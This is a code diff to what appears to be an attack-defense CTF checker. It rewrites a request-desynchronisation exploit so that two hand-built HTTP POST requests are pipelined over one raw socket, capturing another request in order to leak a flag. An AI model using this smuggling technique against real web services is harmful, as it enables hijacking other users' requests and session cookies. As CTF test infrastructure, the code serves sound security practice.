@@ -9,6 +9,7 @@ from html import unescape
 from urllib.parse import parse_qs, quote, unquote, urlencode
 
 import fastapi
+import h11
 import httpx
 from enochecker3 import (
     ChainDB,
@@ -286,6 +287,26 @@ async def _exploit_sca(
     return unquote(url)
 
 
+def _refresh(client: Client, refresh_hash: str) -> bytes:
+    conn = h11.Connection(h11.CLIENT)
+    content = b"hash=" + refresh_hash.encode()
+    packet = conn.send(
+        h11.Request(
+            method="POST",
+            target="/refresh",
+            headers=[
+                ("host", client.base_url.netloc.decode()),
+                ("cookie", "user_account=" + client.cookies["user_account"]),
+                ("content-length", str(len(content))),
+                ("content-type", "application/x-www-form-urlencoded"),
+            ],
+        ),
+    )
+    packet += conn.send(h11.Data(content))
+    packet += conn.send(h11.EndOfMessage())
+    return packet
+
+
 @_CHECKER.exploit(2)
 async def _exploit_desync(client: Client, task: ExploitCheckerTaskMessage) -> str:
     assert task.attack_info is not None
@@ -305,8 +326,8 @@ async def _exploit_desync(client: Client, task: ExploitCheckerTaskMessage) -> st
         + 173  # next request w/o flag & path
         + 24  # path
         + {
-            "🥺[A-Za-z0-9+\\/=]{48}🥺🥺": 48 + 3 * 4,
             "ENO[A-Za-z0-9+\\/=]{48}": 48 + 3,
+            "🥺[A-Za-z0-9+\\/=]{48}🥺🥺": 48 + 3 * 4,
         }[task.flag_regex]
     )
     dump = f"/{letter_noise(128)}"
@@ -316,11 +337,12 @@ async def _exploit_desync(client: Client, task: ExploitCheckerTaskMessage) -> st
         f"\r\n\r\nPOST {dump} HTTP/1.1\r\nhost:{netloc}\r\ncontent-length:{cl}\r\n",
     )
 
-    # TODO: ensure timing is tight enough
-    await asyncio.gather(
-        client.post("/refresh", data={"hash": refresh_hash}),
-        client.post("/refresh", data={"hash": task.attack_info}),
-    )
+    packet = _refresh(client, refresh_hash) + _refresh(client, task.attack_info)
+    _, w = await asyncio.open_connection(client.base_url.host, client.base_url.port)
+    w.write(packet)
+    await w.drain()
+    w.close()
+    await w.wait_closed()
 
     while True:
         logs = await logger(client, dump)
